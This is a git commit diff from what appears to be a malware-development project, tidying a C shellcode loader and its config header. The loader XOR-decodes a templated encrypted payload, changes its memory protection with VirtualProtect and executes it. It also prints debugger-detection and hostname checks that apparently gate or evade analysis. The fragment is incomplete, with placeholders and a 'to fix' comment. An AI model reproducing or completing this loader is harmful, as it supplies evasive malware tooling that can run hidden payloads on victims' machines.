838ff0ff1a1e5f36e2c359ab560e91e925875937
Couscouz <rem.couzi@gmail.com>
2025-02-17 22:32:45 +0100

    clearing

--- src/config.h
+++ src/config.h
@@ -2,8 +2,6 @@
 #define CONFIG_H
 
 #define HOSTNAME_PREFIX "CYCORP-"
-#define KEY_TO_RENAME "ThisIsTheKey"
-#define ROR_VALUE 23
 #define DEBUG_MODE 1
 
 void v();
--- src/loader.c
+++ src/loader.c
@@ -12,7 +12,7 @@ void main() {
 
     char k[] = "%KEY%";
     size_t k_len = strlen(k);
-    short l =  %LENGTH%;
+    short p_l =  %LENGTH%; //payload length
     
     printf("is_debugged: %d\n", is_debugged);
     printf("hostname: %s\n", hostname);
@@ -21,18 +21,16 @@ void main() {
 
 
     size_t ss = sizeof(msgbox_payload);
-    // Manipuler la mémoire via VirtualProtect
     DWORD oldProtect;
     if (!VirtualProtect(msgbox_payload, ss, PAGE_READWRITE, &oldProtect)) {
-        printf("Erreur lors de VirtualProtect: %lu\n", GetLastError());
+        printf("Error during VirtualProtect: %lu\n", GetLastError());
         return;
     }
 
-    // XORer le contenu de msgbox
+    // to fix
     for (size_t i = 0; i < ss; ++i) {
-        msgbox_payload[i] ^= k[i % k_len];  // XOR avec 0xFF
+        msgbox_payload[i] ^= k[i % k_len];
     }
-
 
     ((void (*)())msgbox_payload)();
 }
